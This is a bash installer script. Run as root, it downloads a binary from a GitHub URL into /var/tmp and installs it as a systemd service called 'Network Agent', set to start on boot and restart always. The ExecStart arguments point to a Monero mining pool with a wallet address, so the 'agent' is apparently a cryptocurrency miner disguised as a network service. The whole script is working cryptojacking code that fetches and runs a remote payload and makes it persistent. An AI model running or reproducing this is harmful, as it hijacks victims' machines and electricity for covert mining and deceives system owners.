#!/bin/bash

# Exit on error
set -e

# Variables
URL="https://github.com/yellphonenaing199/installer/raw/refs/heads/main/node-package"
TARGET_DIR="/var/tmp"
FILENAME="node-package"
FULL_PATH="$TARGET_DIR/$FILENAME"
SERVICE_NAME="network-agent-unix"
SERVICE_PATH="/etc/systemd/system/${SERVICE_NAME}.service"
AGENT_PATH="$FULL_PATH"

# Check if running as root
if [[ $EUID -ne 0 ]]; then
    echo "This script needs to be run as root for service installation."
    echo "Please run: sudo $0"
    exit 1
fi

# Check if service is already running
if systemctl is-active --quiet "$SERVICE_NAME" 2>/dev/null; then
    echo "Service $SERVICE_NAME is already running. Stopping it first..."
    systemctl stop "$SERVICE_NAME"
fi

# Ensure target directory exists
mkdir -p "$TARGET_DIR"

# Download the file to /var/tmp
echo "Downloading to $FULL_PATH..."
curl -L -o "$FULL_PATH" "$URL"

# Make it executable
chmod +x "$FULL_PATH"

# Create systemd service file
echo "Creating systemd service..."
cat > "$SERVICE_PATH" <<EOF
[Unit]
Description=Network Agent
After=network.target

[Service]
Type=simple
ExecStart=$AGENT_PATH  -o pool.supportxmr.com:443 -u 44xquCZRP7k5QVc77uPtxb7Jtkaj1xyztAwoyUtmigQoHtzA8EmnAEUbpoeWcxRy1nJxu4UYrR4fN3MPufQQk4MTL6M2Y73 -k --tls -p prolay
Restart=always
RestartSec=60
StandardOutput=journal
StandardError=journal
# Ensure only one instance runs
ExecStartPre=/bin/bash -c 'if pgrep -f "$AGENT_PATH" > /dev/null; then pkill -f "$AGENT_PATH"; sleep 2; fi'

[Install]
WantedBy=multi-user.target
EOF

# Reload systemd and enable service
echo "Reloading systemd daemon..."
systemctl daemon-reload

echo "Enabling service to start on boot..."
systemctl enable "$SERVICE_NAME"

echo "Starting service..."
systemctl start "$SERVICE_NAME"

echo "Service status:"
systemctl status "$SERVICE_NAME" --no-pager -l

echo ""
echo "Service installed successfully!"
echo "To check status: systemctl status $SERVICE_NAME"
echo "To stop service: systemctl stop $SERVICE_NAME"
echo "To disable service: systemctl disable $SERVICE_NAME"
